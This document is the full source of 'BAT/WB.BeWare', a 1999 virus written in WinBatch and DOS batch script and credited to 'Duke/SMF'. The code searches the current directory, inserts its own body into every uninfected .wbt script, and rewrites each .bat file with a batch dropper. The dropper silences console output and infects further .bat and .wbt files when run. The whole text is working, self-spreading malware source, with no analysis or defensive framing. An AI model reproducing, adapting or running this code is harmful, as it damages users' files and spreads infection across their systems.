::
:: BAT/WB.BeWare aka SMF.BeWare
:: (c) by Duke/SMF
:: Windows Interface Language (WinBatch) + DOS Batch Script
:: DOS/Windows/WinBatch application
:: 28.07.99
::

;BAT/WB.BeWare!
;(c) by Duke/SMF ;BeWare!
IntControl(29, @tab, 0, 0, 0) ;BeWare!
ErrorMode(@OFF) ;BeWare!
Viral = "" ;BeWare!
AllWBT = FileItemize("*.wbt") ;BeWare!
For i = 1 to ItemCount(AllWBT, @tab) ;BeWare!
   OneWBT = ItemExtract(i, AllWBT, @tab) ;BeWare!
   Size=FileSize(OneWBT) ;BeWare!
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, OneWBT) ;BeWare!
   If BinaryPeekStr(MarkBuffer, 0, 15) == ";BAT/WB.BeWare!" then
      Viral = OneWBT ;BeWare!
      Break ;BeWare!
   End If ;BeWare!
Next i ;BeWare!
If Viral != OneWBT Then EXIT ;BeWare!
For w = 1 To ItemCount(AllWBT, @tab) ;BeWare!
   OneWBT = ItemExtract(w, AllWBT, @tab) ;BeWare!
   Size=FileSize(OneWBT) ;BeWare!
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, OneWBT) ;BeWare!
   If BinaryPeekStr(MarkBuffer, 0, 15) == ";BAT/WB.BeWare!" then Goto InfWBT
   FileCopy(OneWBT,"C:\BeWare!",0)
   virus = FileOpen(Viral, "READ") ;BeWare!
   host = FileOpen(OneWBT, "WRITE") ;BeWare!
   While @TRUE ;BeWare!
      x = FileRead(virus) ;BeWare!
      FileWrite(host, x) ;BeWare!
      If x == "EXIT ;BeWare!" Then Break
   EndWhile ;BeWare!
   FileClose(virus) ;BeWare!
   FileClose(host) ;BeWare!
   temp = FileOpen("C:\BeWare!", "READ")
   Size=FileSize("C:\BeWare!")
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, "C:\BeWare!")
   BinaryWriteEx(MarkBuffer, 0, OneWBT, 4194, Size)
   FileDelete(temp) ;BeWare!
:InfWBT ;BeWare!
Next w ;BeWare!
BATBody1 = "@REM BeWare" ;BeWare!
BATBody2 = "@goto RunBeWare" ;BeWare!
BATBody3 = ":Comon %%BeWare%%" ;BeWare!
BATBody4 = "@ctty nul%%BeWare%%" ;BeWare!
BATBody5 = "if ^%%1==^BeWareBAT goto BeWareBAT" ;BeWare!
BATBody6 = "if ^%%1==^BeWareWBT goto BeWareWBT" ;BeWare!
BATBody7 = "for %%%%b in (*.bat) do call %%0 BeWareBAT %%%%b" ;BeWare!
BATBody8 = "for %%%%w in (*.wbt) do call %%0 BeWareWBT %%%%w" ;BeWare!
BATBody9 = "del $BeWare$" ;BeWare!
BATBody10 = "goto End%%BeWare%%" ;BeWare!
BATBody11 = ":BeWareBAT" ;BeWare!
BATBody12 = "find ""BeWare""<%%2" ;BeWare!
BATBody13 = "if not errorlevel 1 goto End%%BeWare%%" ;BeWare!
BATBody14 = "copy %%2 $BeWare$" ;BeWare!
BATBody15 = "echo.>>$BeWare$" ;BeWare!
BATBody16 = "echo @goto Comon>>$BeWare$" ;BeWare!
BATBody17 = "echo :End>>$BeWare$" ;BeWare!
BATBody18 = "find ""BeWare""<%%0>%%2" ;BeWare!
BATBody19 = "type $BeWare$>>%%2" ;BeWare!
BATBody20 = "goto End%%BeWare%%" ;BeWare!
BATBody21 = ":BeWareWBT" ;BeWare!
BATBody22 = "find ""BeWare""<%%2" ;BeWare!
BATBody23 = "if not errorlevel 1 goto End%%BeWare%%" ;BeWare!
BATBody24 = "copy %%2 $BeWare$" ;BeWare!
BATBody25 = "find ""BeWare%%BeWare%%!""<%%0>%%2" ;BeWare!
BATBody26 = "type $BeWare$>>%%2" ;BeWare!
BATBody27 = "goto End%%BeWare%%" ;BeWare!
BATBody28 = ":RunBeWare" ;BeWare!
BATBody29 = "@goto Comon" ;BeWare!
BATBody30 = ":End" ;BeWare!
AllBAT = FileItemize("*.bat") ;BeWare!
For w = 1 To ItemCount(AllBAT, @tab) ;BeWare!
   OneBAT = ItemExtract(w, AllBAT, @tab) ;BeWare!
   Size=FileSize(OneBAT) ;BeWare!
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, OneBAT) ;BeWare!
   If BinaryPeekStr(MarkBuffer, 0, 11) == "@REM BeWare" then Goto InfBAT ;BeWare!
   FileCopy(OneBAT,"C:\BeWare!",0)
   host = FileOpen(OneBAT, "WRITE") ;BeWare!
   For j = 1 to 27 ;BeWare!
      FileWrite(host, BATBody%j%) ;BeWare!
   Next j ;BeWare!
   virus = FileOpen(Viral, "READ") ;BeWare!
   While @TRUE ;BeWare!
      x = FileRead(virus) ;BeWare!
      FileWrite(host, x) ;BeWare!
      If x == "EXIT ;BeWare!" Then Break
   EndWhile ;BeWare!
   FileWrite(host,BATBody28) ;BeWare!
   FileClose(virus) ;BeWare!
   FileClose(host) ;BeWare!
   Size=FileSize("C:\BeWare!")
   MarkBuffer = BinaryAlloc(Size+100) ;BeWare!
   BinaryRead(MarkBuffer, "C:\BeWare!") ;BeWare!
   BinaryWriteEx(MarkBuffer, 0, OneBAT, 4827, Size) ;BeWare!
   temp = FileOpen("C:\BeWare!", "READ")
   FileDelete(temp) ;BeWare!
   host = FileOpen(OneBAT, "APPEND") ;BeWare!
   FileWrite(host,BATBody29) ;BeWare!
   FileWrite(host,BATBody30) ;BeWare!
   FileClose(host) ;BeWare!
:InfBAT ;BeWare!
Next w ;BeWare!
EXIT ;BeWare!